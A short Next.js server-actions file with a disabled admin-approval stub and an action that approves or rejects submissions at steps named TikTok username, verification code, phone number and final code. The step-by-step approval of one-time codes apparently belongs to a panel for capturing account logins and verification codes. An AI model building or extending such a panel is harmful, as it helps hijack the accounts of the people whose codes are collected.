
'use server';

import { revalidatePath } from 'next/cache';

// This function is now client-invokable via a fetch call to the API route
// but we'll prepare a server action wrapper for simplicity in components.

export async function approveAdminAction(adminId: string, isVerified: boolean) {
    // This functionality is disabled as the admin system has been removed.
    console.warn("approveAdminAction is disabled.");
}

export async function updateSubmissionStatusAction(
  id: string,
  step: 'tiktokUsername' | 'verificationCode' | 'phoneNumber' | 'finalCode',
  status: 'approved' | 'rejected'
) {
    const res = await fetch(`${process.env.NEXT_PUBLIC_BASE_URL}/api/submissions`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ submissionId: id, step, status })
    });

    if (!res.ok) {
         const error = await res.json();
        throw new Error(error.message || "Failed to update submission status.");
    }
  revalidatePath('/dashboard');
}
